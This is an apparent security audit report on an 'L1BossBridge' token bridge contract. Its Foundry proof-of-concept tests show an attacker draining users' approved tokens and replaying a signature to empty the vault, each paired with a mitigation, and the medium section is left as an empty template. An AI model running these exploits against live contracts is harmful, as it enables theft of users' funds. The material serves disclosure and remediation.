## HIGH

### [H-1] - `L1BossBridge::depositTokensToL2` can be used to drain funds on any user that approved the protocol.

**Description**: The `depositTokensToL2` function allows the users to deposit their L1 tokens into the `L1Vault` so they can be locked and then minted in the L2.

However, the function does not have any verification on the function caller, so anyone can call the function and drain funds from any user that approved the protocol.

**Impact**: High, any user can drain funds from another user that approved the protocol, by using the `depositTokensToL2` function.

**Proof of Concept**: (Proof of Code)

The following unit test demostrate how an `attacker` can steal the `user` funds once they approved the protocol to spent their tokens, but the `user` has not deposited any tokens yet, instead, the `attacker` can call the `depositTokensToL2` function and drain the funds from the `user`.

Place the following unit test into the `L1TokenBridge.t.sol` file:

```solidity
    function test_arbitraryUserCanMoveEveryoneFunds() public {
        uint256 amount = 10e18;
        // 'user' approve bridge to spend 'amount'
        vm.startPrank(user);
        token.approve(address(tokenBridge), amount);
        uint256 userBalanceBeforeAttack = token.balanceOf(user);
        vm.stopPrank();
        // attacker
        address attacker = makeAddr("attacker");
        vm.startPrank(attacker);
        vm.expectEmit(address(tokenBridge));
        emit Deposit(user, attacker, amount);
        // deposit 'user' L1 funds to 'attacker' to L2
        tokenBridge.depositTokensToL2(user, attacker, amount);
        vm.stopPrank();
        assertEq(
            token.balanceOf(user),
            userBalanceBeforeAttack - amount,
            "User funds not moved to attacker"
        );
        assertEq(
            token.balanceOf(address(vault)),
            amount,
            "Vault funds should increase."
        );
    }
```

**Recommended Mitigation**: 

A simple solution is to force the function caller (`msg.sender`) to always be the `from` address, this way, each user will only be able to move their funds.

```diff
-   function depositTokensToL2(address from, address l2Recipient, uint256 amount) external whenNotPaused {
+   function depositTokensToL2(address l2Recipient, uint256 amount) external whenNotPaused {
        if (token.balanceOf(address(vault)) + amount > DEPOSIT_LIMIT) {
            revert L1BossBridge__DepositLimitReached();
        }
-       token.safeTransferFrom(from, address(vault), amount);
+       token.safeTransferFrom(msg.sender, address(vault), amount);

        // Our off-chain service picks up this event and mints the corresponding tokens on L2
-       emit Deposit(from, l2Recipient, amount);
+       emit Deposit(msg.sender, l2Recipient, amount);
    }
```
Harmonize the rest of the code to fulfill this requirement.

### [H-2] - `L1BossBridge::withdrawTokensToL1` Signature Replay Can Lead to Loss of Funds.

**Description**: The `withdrawTokensToL1` function does not validate the signature correctly. An attacker can reuse valid signature, leading to multiple withdrawals and potential loss of funds.

In the scenario where an user calls the `withdrawTokensToL1` function with a valid signature, it will execute the withdrawal process. However, if an attacker reuses this same signature (values `v`,`r`,`s` that can be found in any old transaction where the same call was made), they can trigger multiple withdrawals from the vault to their own address.

**Impact**: Attackers can exploit this vulnerability by reusing the same signature, causing repeated transfers from the vault to the attacker's address. This results in unauthorized withdrawal of tokens and financial loss.

**Proof of Concept**: (Proof of Code)

The following unit test demostrate how an attacker can exploit the `withdrawTokensToL1` function by reusing a valid signature from the `operator`.

Place the following unit test into the `L1TokenBridge.t.sol` file:

```solidity
function test_signatureReplay() public {
    address attacker = makeAddr("attacker");
    uint256 vaultInitialBalance = 1000e18;
    uint256 attackerInitialBalance = 100e18;
    deal(address(token), address(vault), vaultInitialBalance);
    deal(address(token), attacker, attackerInitialBalance);

    // An attacker deposits tokens to L2
    vm.startPrank(attacker);
    token.approve(address(tokenBridge), type(uint256).max);
    tokenBridge.depositTokensToL2(
        attacker,
        attacker,
        attackerInitialBalance
    );
    
    bytes memory message = abi.encode(
        address(token),
        0,
        abi.encodeCall(
            IERC20.transferFrom,
            (address(vault), attacker, attackerInitialBalance)
        )
    );

    // Sign the message with the operator's private key
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(
        operator.key,
        MessageHashUtils.toEthSignedMessageHash(keccak256(message))
    );

    // Reuse the signature for multiple withdrawals
    while (token.balanceOf(address(vault)) > 0) {
        tokenBridge.withdrawTokensToL1(
            attacker,
            attackerInitialBalance,
            v,
            r,
            s
        );
    }

    vm.stopPrank();
    
    // Check that the attacker's balance is higher than initial balance
    assertEq(
        token.balanceOf(attacker),
        attackerInitialBalance + vaultInitialBalance,
        "Attacker balance should be higher."
    );
}
```

Execute the test using the following command:

```bash
forge test --mt test_signatureReplay -vvvv
```

**Recommended Mitigation**: Add EIP-712 protections and add a mechanism to allow tokens to be transferred to a different address using EIP-2612 permit().

## MEDIUM

### [H-2] - 

**Description**:

**Impact**:

**Proof of Concept**: (Proof of Code)

**Recommended Mitigation**: 

## LOW

### [L-1] - Events missing indexed parameters

**Description**:  Events in Solidity can have up to three indexed parameters, which are stored as topics in the event log. Indexed parameters allow for efficient filtering and searching of events by off-chain services. Without indexed parameters, it becomes more difficult and resource-intensive for applications to filter for specific events.

**Impact**: low.

**Proof of Concept**: 

The current codebase for the `Deposit` event does not include any indexed parameter.

```solidity
event Deposit(address from, address to, uint256 amount);
```

**Recommended Mitigation**: Add the indexed keyword to important parameters in the event that would commonly be used for filtering, such as `from` and `to` parameters.

```diff
-   event Deposit(address from, address to, uint256 amount);
+   event Deposit(address indexed from, address indexed to, uint256 amount);
```

## INFORMATIONAL

### [I-1] - `L1BossBridge::depositTokensToL2` doesn't follow CEI pattern

**Description**: The `depositTokensToL2` function will deposit the L1 token to the `L1Vault` and emit the `Deposit` event.  The issue is that the function doesn't follow the CEI pattern.

**Impact**: Low.

**Recommended Mitigation**: It is advised to follow CEI pattern wherever possible and follow the above recommendations in order to fix this issue.

This is an example on following the CEI pattern on the function:

```diff
    function depositTokensToL2(address from, address l2Recipient, uint256 amount) external whenNotPaused {
        // checks
        if (token.balanceOf(address(vault)) + amount > DEPOSIT_LIMIT) {
            revert L1BossBridge__DepositLimitReached();
        }
        // effects
+       // Our off-chain service picks up this event and mints the corresponding tokens on L2
+       emit Deposit(from, l2Recipient, amount);
        // interactions
        token.safeTransferFrom(from, address(vault), amount);

-       // Our off-chain service picks up this event and mints the corresponding tokens on L2
-       emit Deposit(from, l2Recipient, amount);
    }
```

## GAS

### [G-1] - `L1BossBridge::DEPOSIT_LIMIT` can be declared as constant or immutable

**Description**: The `DEPOSIT_LIMIT` variable in the `L1BossBridge` contract is not designed to be modified after deployment, as no setter function exists. Keeping it mutable introduces unnecessary complexity, gas cost, and potential misuse.

**Impact**: Low.

**Proof of Concept**: 

This is the actual implementation for the `L1BossBridge::DEPOSIT_LIMIT` variable:

In `L1BossBridge.sol`:

```solitidy
    uint256 public DEPOSIT_LIMIT = 100_000 ether;
```

There is no setter function for `DEPOSIT_LIMIT`, which means it cannot be changed after the initialization.

**Recommended Mitigation**: Consider marking `DEPOSIT_LIMIT` as constant or immutable to enforce immutability and improve gas efficiency.

```diff
-   uint256 public DEPOSIT_LIMIT = 100_000 ether;
+   uint256 public constant DEPOSIT_LIMIT = 100_000 ether;
```